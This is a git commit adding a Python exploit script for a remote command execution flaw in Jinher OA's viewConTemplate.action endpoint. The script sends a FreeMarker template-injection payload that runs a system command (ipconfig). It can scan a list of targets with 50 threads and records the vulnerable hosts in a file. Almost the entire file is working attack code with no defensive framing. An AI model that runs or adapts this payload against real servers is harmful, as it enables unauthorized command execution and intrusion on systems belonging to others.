46a861af9504d19e6f88532292f553cee3e24422
watermelonxz <watermelon_xz@163.com>
2024-06-16 22:25:22 +0800

    Add files via upload

---
+++ 09_金和OA viewConTemplate.action远程命令执行漏洞/rce.py
@@ -0,0 +1,93 @@
+# 金和OA viewConTemplate.action远程命令执行漏洞
+import argparse
+from multiprocessing.dummy import Pool
+import requests
+import sys
+requests.packages.urllib3.disable_warnings()
+import time
+
+#定义横幅
+
+
+def banner():
+    banner = """
+██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
+██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
+██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
+██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
+╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
+ ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
+                                             author:watermelon_xz🍉
+                                  version:金和OA viewConTemplate.action远程命令执行漏洞
+"""
+    print(banner)
+
+
+#定义主函数
+def main():
+    #调用横幅
+    banner()
+    #argparse模块处理命令行参数
+    parser = argparse.ArgumentParser(description="金和OA viewConTemplate.action远程命令执行漏洞")
+    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
+    args = parser.parse_args()
+    #如果用户输入url而不是file时：
+    if args.url and not args.file:
+        poc(args.url)
+        # if poc(args.url):
+        #     exp(args.url)
+    #如果用户输入file而不是url时：
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,mode='r',encoding='utf-8') as fr:
+            for i in fr.readlines():
+                url_list.append(i.strip().replace('\n',''))
+                # print(url_list)    
+                #设置多线程 
+        mp = Pool(50)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    #如果用户输入的既不是url也不是file时：
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+             
+#定义poc
+def poc(target):
+    payload = '/jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action'
+    url = target+payload
+    headers = {
+        'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
+        'Accept':'*/*',
+        'Accept-Encoding':'gzip, deflate',
+        'Content-Type':'application/x-www-form-urlencoded',
+        'Connection':'close', 
+         }
+    data ='''moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%28%29%28%2522ipconfig%2522%29%257D%253C%252Fclob%253E&uuid=1'''
+    proxies = {
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:8080'
+    }
+
+    #请求网页
+    try:
+        re = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies)
+        # print(re.text)
+        # print('111')
+        if re.status_code == 200 and 'clob' in re.text:
+            # print("200啦")
+            print(f'[+++]该{target}存在金和OA viewConTemplate.action远程命令执行漏洞')
+            with open('result.txt',mode='a',encoding='utf-8')as ft:
+                ft.write(target+'\n')
+            return True
+        else:
+            print(f'该{target}不存在该漏洞')
+            return False
+    except:
+        print(f'该{target}存在问题，请手动测试')
+        return False
+
+
+if __name__ == '__main__':
+    main()
